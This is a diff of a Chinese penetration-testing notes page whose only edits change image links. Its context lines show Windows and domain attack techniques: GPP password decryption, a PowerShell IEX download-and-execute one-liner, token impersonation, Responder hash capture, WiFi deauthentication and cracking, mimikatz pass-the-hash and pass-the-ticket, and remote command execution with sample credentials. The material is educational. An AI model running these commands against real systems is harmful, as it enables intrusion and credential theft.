 <h2 id="1、手工发现缺失补丁"><a href="#1、手工发现缺失补丁" class="headerlink" title="1、手工发现缺失补丁"></a>1、手工发现缺失补丁</h2><h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p>直接运行 systeminfo 命令，在「修补程序」（英文：Hotfix(s) ）处可以看到已安装的补丁。</p>
 <pre class="line-numbers language-none"><code class="language-none">C:\Users\teamssix&gt; systeminfo……内容过多，此处省略……修补程序: 安装了 2 个修补程序。         [01]: KB2999226         [02]: KB976902……内容过多，此处省略……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -1784,7 +1784,7 @@ python wes.py --update<span aria-hidden="true" class="line-numbers-rows"><span><
 <p>直接使用 wesng 即可</p>
 <pre class="line-numbers language-none"><code class="language-none">python wes.py info.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210706145250.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210706145250.png"></p>
 <p>使用 wesng 可以直接看到目标主机可能存在的 CVE 漏洞，从而便于我们有针对性的利用这些漏洞。</p>
 <h1 id="0x15-系统服务权限配置不当利用"><a href="#0x15-系统服务权限配置不当利用" class="headerlink" title="0x15 系统服务权限配置不当利用"></a>0x15 系统服务权限配置不当利用</h1><h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><p>PowerUp 可以用来寻找目标中权限配置不当的服务，下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1</a></p>
 <p>在 PowerShell 中导入并执行脚本</p>
@@ -1818,21 +1818,21 @@ set lport 4444
 set session 1
 run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210722172401.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210722172401.png"></p>
 <p>可以看到会话直接被提升到了 SYSTEM 权限。</p>
 <h1 id="0x16-组策略凭据获取"><a href="#0x16-组策略凭据获取" class="headerlink" title="0x16 组策略凭据获取"></a>0x16 组策略凭据获取</h1><h2 id="0、前言-1"><a href="#0、前言-1" class="headerlink" title="0、前言"></a>0、前言</h2><p>SYSVOL 是活动目录里的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控之间进行复制，SYSVOL 在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录域范围内共享，所有的域策略均存放在 C:\Windows\SYSVOL\DOMAIN\Policies\ 目录中。</p>
 <p>管理员在域中新建一个组策略后，系统会自动在 SYSVOL 目录中生成一个 XML 文件。</p>
 <p>该文件中保存了该组策略更新后的密码，该密码使用 AES-256 算法，但 2012 年微软公布了该密码的私钥，也就是说任何人都可以对其进行解密。</p>
 <h2 id="1、查找包含-cpassword-的-XML-文件"><a href="#1、查找包含-cpassword-的-XML-文件" class="headerlink" title="1、查找包含 cpassword 的 XML 文件"></a>1、查找包含 cpassword 的 XML 文件</h2><p>浏览 SYSVOL 文件夹，手动查找包含 cpassword 的 XML 文件</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210728141704.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728141704.png"></p>
 <p>或者使用 findstr 自动搜索包含 cpassword 的 XML 文件</p>
 <pre class="line-numbers language-none"><code class="language-none">findstr &#x2F;s &#x2F;i &quot;cpassword&quot; C:\Windows\SYSVOL\*.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210728142511.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728142511.png"></p>
 <h2 id="2、解密-cpassword-密文"><a href="#2、解密-cpassword-密文" class="headerlink" title="2、解密 cpassword 密文"></a>2、解密 cpassword 密文</h2><h3 id="python-脚本"><a href="#python-脚本" class="headerlink" title="python 脚本"></a>python 脚本</h3><p> Gpprefdecrypt.py 下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py">https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py</a></p>
 <pre class="line-numbers language-none"><code class="language-none">python2.7 Gpprefdecrypt.py Wdkeu1drbxqPJm7YAtPtwBtyzcqO88hJUBDD2eseoY0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210728143302.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728143302.png"></p>
 <h3 id="PowerShell-脚本"><a href="#PowerShell-脚本" class="headerlink" title="PowerShell 脚本"></a>PowerShell 脚本</h3><p>PowerSploit 项目中提供了 Get-GPPPassword.ps1 脚本。</p>
 <p>脚本下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p>
 <p>直接远程下载脚本执行：</p>
@@ -1841,7 +1841,7 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 <p>如果无法下载可以使用 github 代理</p>
 <pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210728144214.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728144214.png"></p>
 <p>或者下载到本地，执行也行</p>
 <pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-GPPPassword.ps1
 Get-GPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -1854,25 +1854,25 @@ Get-GPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span><
 set session 1
 run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210728145138.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728145138.png"></p>
 <h1 id="0x17-令牌窃取"><a href="#0x17-令牌窃取" class="headerlink" title="0x17 令牌窃取"></a>0x17 令牌窃取</h1><h2 id="0、前言-2"><a href="#0、前言-2" class="headerlink" title="0、前言"></a>0、前言</h2><p>令牌（Token）是指系统中的临时秘钥，相当于账户和密码，有了令牌就可以在不知道密码的情况下访问目标相关资源了，这些令牌将持续存在于系统中，除非系统重新启动。</p>
 <h2 id="1、MSF"><a href="#1、MSF" class="headerlink" title="1、MSF"></a>1、MSF</h2><p>在获取到 Meterpreter Shell 后，使用以下命令获取令牌</p>
 <pre class="line-numbers language-none"><code class="language-none">load incognitolist_tokens -u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210729095721.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729095721.png"></p>
 <p>这里有两种令牌，一个是 Delegation Tokens 即授权令牌，还有一种是 Impersonation Tokens 即模拟令牌。前者支持交互式登录比如远程桌面，后者支持非交互的会话。</p>
 <p>令牌获取的数量取决于获取到 Shell 的权限等级。</p>
 <p>如果已经获取到了 SYSTEM 权限的令牌，那么攻击者就可以伪造这个令牌，拥有对应的权限。</p>
 <pre class="line-numbers language-none"><code class="language-none">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210729100415.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729100415.png"></p>
 <p>可以看到我们已经通过伪造 SYSTEM 的令牌拿到 SYSTEM 权限了。</p>
 <p>不过值得注意的是，如果不加双引号，\ 需要改成 <code>\\</code> 才行，个人猜测可能是因为 \ 被当做转义字符处理的原因。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210729100653.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729100653.png"></p>
 <h2 id="2、Rotten-Potato-本地提权"><a href="#2、Rotten-Potato-本地提权" class="headerlink" title="2、Rotten Potato 本地提权"></a>2、Rotten Potato 本地提权</h2><p>Rotten Potato 直译过来就烂土豆的意思，如果目标中存在有效的令牌，就可以通过 Rotten Potato 模拟用户令牌实现提权。</p>
 <p>Rotten Potato 项目地址：<a target="_blank" rel="noopener" href="https://github.com/breenmachine/RottenPotatoNG">https://github.com/breenmachine/RottenPotatoNG</a></p>
 <p>运行 RottenPotato.exe 直接弹出 SYSTEM 权限的 CMD 窗口，不需要用到 MSF。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210729101949.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729101949.png"></p>
 <h1 id="0x18-LLMNR-和-NetBIOS-欺骗攻击"><a href="#0x18-LLMNR-和-NetBIOS-欺骗攻击" class="headerlink" title="0x18 LLMNR 和 NetBIOS 欺骗攻击"></a>0x18 LLMNR 和 NetBIOS 欺骗攻击</h1><h2 id="0、前言-3"><a href="#0、前言-3" class="headerlink" title="0、前言"></a>0、前言</h2><p>如果已经进入目标网络，但是没有获得凭证，可以使用 LLMNR 和 NetBIOS 欺骗攻击对目标进行无凭证条件下的权限获取。</p>
 <h2 id="1、基本概念"><a href="#1、基本概念" class="headerlink" title="1、基本概念"></a>1、基本概念</h2><h3 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h3><p>本地链路多播名称解析（LLMNR）是一种域名系统数据包格式，当局域网中的 DNS 服务器不可用时，DNS 客户端就会使用 LLMNR 解析本地网段中机器的名称，直到 DNS 服务器恢复正常为止。</p>
 <p>从 Windows Vista 开始支持 LLMNR ，Linux 系统也通过 systemd 实现了此协议，同时 LLMNR 也支持 IPv6。</p>
@@ -1899,11 +1899,11 @@ iii、Session Service（会话服务）：允许两台计算机建立连接，�
 <pre class="line-numbers language-none"><code class="language-none">python Responder.py -I eth1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>开启监听后，当目标主机上有人访问 Responder 主机的共享目录时，就会看到对方的 Net-NTLM 哈希值了。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210729190444.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729190444.png"></p>
 <p>再利用 Hashcat 进行碰撞</p>
 <pre class="line-numbers language-none"><code class="language-none">hashcat -m 5600 hash.txt password.txt -D 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210729190835.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729190835.png"></p>
 <h1 id="0x19-IPC-与计划任务"><a href="#0x19-IPC-与计划任务" class="headerlink" title="0x19 IPC 与计划任务"></a>0x19 IPC 与计划任务</h1><h2 id="0、前言-4"><a href="#0、前言-4" class="headerlink" title="0、前言"></a>0、前言</h2><p>在多层代理的环境中，由于网络限制，通常采用命令行的方式连接主机，这里学习下 IPC 建立会话与配置计划任务的相关点。</p>
 <h2 id="1、IPC"><a href="#1、IPC" class="headerlink" title="1、IPC"></a>1、IPC</h2><p>IPC (Internet Process Connection) 是为了实现进程间通信而开放的命名管道，当目标开启了 IPC$ 文件共享并得到用户账号密码后，就可以使用 IPC 建立连接，获取权限。</p>
 <p>建立 IPC 连接：</p>
@@ -1974,7 +1974,7 @@ schtasks &#x2F;run &#x2F;s 192.168.7.107 &#x2F;i &#x2F;tn &quot;evil&quot;<span 
 <p>PsExec 下载地址：<a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p>
 <pre class="line-numbers language-none"><code class="language-none">Psexec.exe -accepteula \\192.168.7.107 -s cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210802180916.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210802180916.png"></p>
 <h1 id="0x20-Hashcat-的使用"><a href="#0x20-Hashcat-的使用" class="headerlink" title="0x20 Hashcat 的使用"></a>0x20 Hashcat 的使用</h1><h2 id="1、介绍-6"><a href="#1、介绍-6" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>Hashcat 是一款用于破解密码的工具，据说是世界上最快最高级的密码破解工具，支持 LM 哈希、MD5、SHA 等系列的密码破解，同时也支持 Linux、Mac、Windows 平台。</p>
 <p>工具地址：<a target="_blank" rel="noopener" href="https://hashcat.net/">https://hashcat.net</a></p>
 <p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></p>
@@ -2136,7 +2136,7 @@ schtasks &#x2F;run &#x2F;s 192.168.7.107 &#x2F;i &#x2F;tn &quot;evil&quot;<span 
 <p>2、扫描可用 WIFI</p>
 <pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210831104636.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210831104636.png"></p>
 <p>3、获取wifi的握手包</p>
 <pre class="line-numbers language-none"><code class="language-none">airodump-ng -c (上一步扫描的 CH ) --bssid (想要破解 WIFI 的 bssid ) -w (握手文件存放目录) wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -2146,12 +2146,12 @@ schtasks &#x2F;run &#x2F;s 192.168.7.107 &#x2F;i &#x2F;tn &quot;evil&quot;<span 
 <p>为了顺利得到 WIFI 的握手包，可以将该 WIFI 下的设备强制踢下去</p>
 <pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a (要破解的 wifi 的 bssid ) -c (强制踢下的设备的 MAC 地址) wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210831105351.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210831105351.png"></p>
 <p>可以看到 teamssix 这个 WIFI 有一个设备正在连接，该设备的 MAC 地址为：38:26:2C:13:D3:33，使用以下命令可以将其强制踢下去</p>
 <pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a 5E:C1:1B:A2:37:F1 -c 38:26:2C:13:D3:33 wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>等待设备重新连接后，当右上角出现 WPA handshake 的时候说明获取成功</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210831132010.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210831132010.png"></p>
 <p>4、破解密码</p>
 <p>使用 aircrack-ng 将握手包转换成 hccapx 格式</p>
 <pre class="line-numbers language-none"><code class="language-none">aircrack-ng 1.cap -j 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -2161,7 +2161,7 @@ schtasks &#x2F;run &#x2F;s 192.168.7.107 &#x2F;i &#x2F;tn &quot;evil&quot;<span 
 <p>或者使用 hashcat 官网提供的在线工具进行格式转换：<a target="_blank" rel="noopener" href="https://hashcat.net/cap2hashcat/">https://hashcat.net/cap2hashcat/</a></p>
 <pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 22000 1.hc22000 ?d?d?d?d?d?d?d?d --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210831113326.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210831113326.png"></p>
 <h2 id="5、其他"><a href="#5、其他" class="headerlink" title="5、其他"></a>5、其他</h2><ul>
 <li><p>Hashcat 在有时破解的时候会提示 All hashes found in potfile!，这表明该 hash 已经被破解出来过了，可以使用 hashcat [哈希值] –show 查看已破解出来的明文密码。</p>
 </li>
@@ -2188,7 +2188,7 @@ sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span
 <pre class="line-numbers language-none"><code class="language-none">privilege::debug
 sekurlsa::pth &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;ntlm:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210901120511.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210901120511.png"></p>
 <p>mimikatz 执行后，会弹出一个拥有对应 Hash 用户权限的 CMD 窗口。</p>
 <h3 id="AES-256-密钥"><a href="#AES-256-密钥" class="headerlink" title="AES-256 密钥"></a>AES-256 密钥</h3><p>使用 mimikatz 抓取密钥</p>
 <pre class="line-numbers language-none"><code class="language-none">privilege::debug
@@ -2214,12 +2214,12 @@ sekurlsa::tickets &#x2F;export<span aria-hidden="true" class="line-numbers-rows"
 <pre class="line-numbers language-none"><code class="language-none">kerberos::ptt &quot;[0;4beae]-2-0-40e00000-Administrator@krbtgt-TEAMSSIX.COM.kirbi&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>在当前终端下退出 mimikatz ，然后就可以列出目标目录了。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210901153402.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210901153402.png"></p>
 <p>票据传递除了用 mimikatz 还可以用 kekeo</p>
 <h3 id="kekeo"><a href="#kekeo" class="headerlink" title="kekeo"></a>kekeo</h3><p>kekeo 需要使用域名、用户名、NTLM HASH 生成票据，然后再将票据导入，从而连接远程计算机。</p>
 <pre class="line-numbers language-none"><code class="language-none">tgt::ask &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;ntlm:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210901154851.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210901154851.png"></p>
 <p>在 kekeo 中清除当前内存中的其他票据，不然可能会导致票据传递失败</p>
 <pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -2229,7 +2229,7 @@ sekurlsa::tickets &#x2F;export<span aria-hidden="true" class="line-numbers-rows"
 <p>使用以下命令将票据导入内存，之后 exit 退出 kekeo，使用 dir 命令就可以列出远程文件了。</p>
 <pre class="line-numbers language-none"><code class="language-none">kerberos::ptt &quot;TGT_administrator@TEAMSSIX.COM_krbtgt~teamssix.com@TEAMSSIX.COM.kirbi&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210901155501.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210901155501.png"></p>
 <p>注意点：</p>
 <p>1、票据文件注入内存的默认有效时间为 10 小时</p>
 <p>2、在目标机器上不需要本地管理员权限就可以进行票据传递</p>
@@ -2245,7 +2245,7 @@ sekurlsa::tickets &#x2F;export<span aria-hidden="true" class="line-numbers-rows"
 
 <pre class="line-numbers language-none"><code class="language-none">-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902092309.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902092309.png"></p>
 <p>如果没有建立 ipc$ 连接，也可以直接使用 PsExec 指定用户名密码进行连接</p>
 <pre class="line-numbers language-none"><code class="language-none">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -2277,21 +2277,21 @@ sekurlsa::tickets &#x2F;export<span aria-hidden="true" class="line-numbers-rows"
 <p>之后建立 IPC$ ，使用 type 读取执行结果</p>
 <pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administratortype \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902112523.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902112523.png"></p>
 <p>也可以预先建立 ipc$ 连接，再使用 wmic</p>
 <pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administratorwmic &#x2F;node:192.168.7.7 process call create &quot;cmd.exe &#x2F;c ipconfig &gt;c:\ip.txt&quot;type \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h3><p>在 impacket 工具包里有 wmiexec.py 脚本，可以用来直接获取 shell</p>
 <pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902113920.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902113920.png"></p>
 <p>wmiexec.py 还支持通过哈希传递获得 shell</p>
 <pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py -hashes LMHash:NTHash 域名&#x2F;用户名@目标IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h3 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h3><p>wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能，wmiexec.vbs 下载地址：<a target="_blank" rel="noopener" href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a></p>
 <pre class="line-numbers language-none"><code class="language-none">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.7.7 administrator 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902122716.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902122716.png"></p>
 <p>使用 vmiexec.vbs 执行单条命令</p>
 <pre class="line-numbers language-none"><code class="language-none">cscript wmiexec.vbs &#x2F;cmd 192.168.7.7 administrator 1qaz@WSX &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -2318,7 +2318,7 @@ $Remote &#x3D; Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred
 # 将执行结果输出到屏幕上
 $Remote.PayloadOutput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902130614.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902130614.png"></p>
 <h3 id="Invoke-WMIMethod"><a href="#Invoke-WMIMethod" class="headerlink" title="Invoke-WMIMethod"></a>Invoke-WMIMethod</h3><p>Invoke-WMIMethod 是 PowerShell 自带的一个模块，也可以用它来连接远程计算机执行命令和指定程序。</p>
 <pre class="line-numbers language-none"><code class="language-none"># 指定目标系统用户名
 $User&#x3D;&quot;teamssix.com\administrator&quot;
@@ -2332,7 +2332,7 @@ $Cred&#x3D;New-Object -TypeName System.Management.Automation.PSCredential -Argum
 # 在远程系统中运行 calc.exe 命令
 Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.7.7&quot; -Credential $Cred<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902131658.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902131658.png"></p>
 <p>可以看到在 192.168.7.7 主机中已经有进程 ID 为 3276 的 calc.exe 被执行了。</p>
 <h3 id="wmic-的其他命令"><a href="#wmic-的其他命令" class="headerlink" title="wmic 的其他命令"></a>wmic 的其他命令</h3><p>使用 wmic 远程开启目标的 RDP</p>
 <pre class="line-numbers language-none"><code class="language-none"># 适于 Windows xp、server 2003
@@ -2346,7 +2346,7 @@ wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX pro
 <p>判断 RDP 有没有开可以使用以下命令，如果返回 0 表示开启，返回 1 表示关闭。</p>
 <pre class="line-numbers language-none"><code class="language-none">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p> <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902135523.png"></p>
+<p> <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902135523.png"></p>
 <p>使用 wmic 远程重启目标计算机</p>
 <pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &quot;shutdown.exe -r -f -t 0&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -2356,7 +2356,7 @@ wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX pro
 <h3 id="impacket-版"><a href="#impacket-版" class="headerlink" title="impacket 版"></a>impacket 版</h3><p>在 impacket 工具包里包含了 smbexec.py 工具，使用起来也很简单。</p>
 <pre class="line-numbers language-none"><code class="language-none">python3 smbexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902153131.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902153131.png"></p>
 <h3 id="Linux-跨平台-Windows-远程命令执行"><a href="#Linux-跨平台-Windows-远程命令执行" class="headerlink" title="Linux 跨平台 Windows 远程命令执行"></a>Linux 跨平台 Windows 远程命令执行</h3><p>smbexec 工具包下载地址：<a target="_blank" rel="noopener" href="https://github.com/brav0hax/smbexec">https://github.com/brav0hax/smbexec</a></p>
 <p>这里安装以 Kali 为例</p>
 <pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;brav0hax&#x2F;smbexec.gitcd smbexec&#x2F;chmod +x install.shsudo .&#x2F;install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -2378,11 +2378,11 @@ wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX pro
 <pre class="line-numbers language-none"><code class="language-none">1. Save State            &#x2F;&#x2F; 保存当前状态2. Load State            &#x2F;&#x2F; 加载以前保存的状态3. Set Thread Count      &#x2F;&#x2F; 设置线程数4. Generate SSL Cert     &#x2F;&#x2F; 生成 SSL 证书5. Enter Stealth Mode    &#x2F;&#x2F; 进入安静模式6. About                 &#x2F;&#x2F; 关于7. Main menu             &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>获取目标系统 UAC 的状态</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902163458.png"></p>
